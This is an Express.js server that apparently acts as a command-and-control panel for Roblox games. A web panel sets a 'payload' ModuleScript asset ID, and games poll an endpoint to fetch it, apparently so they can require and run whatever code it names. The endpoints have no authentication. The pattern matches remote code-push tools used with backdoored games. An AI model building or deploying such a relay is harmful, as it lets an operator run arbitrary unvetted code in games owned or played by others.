const express = require('express');
const app = express();
const PORT = 3000;

// This variable stores the current Asset ID to be required
let currentPayloadId = ""; 

app.use(express.json());

// Endpoint for your web panel frontend to update the Asset ID
app.post('/update-script', (req, res) => {
    const { assetId } = req.body;
    if (!assetId || isNaN(assetId)) {
        return res.status(400).json({ error: "Invalid Roblox ModuleScript Asset ID" });
    }
    
    currentPayloadId = assetId;
    console.log(`[Panel] New script ID set: ${currentPayloadId}`);
    res.json({ success: true, message: `Payload updated to ID: ${assetId}` });
});

// Endpoint that the Roblox game calls to fetch the latest command
app.get('/get-command', (req, res) => {
    res.json({ assetId: currentPayloadId });
});

// Clear the command once executed (called by Roblox if desired, or handled manually)
app.post('/clear-command', (req, res) => {
    currentPayloadId = "";
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
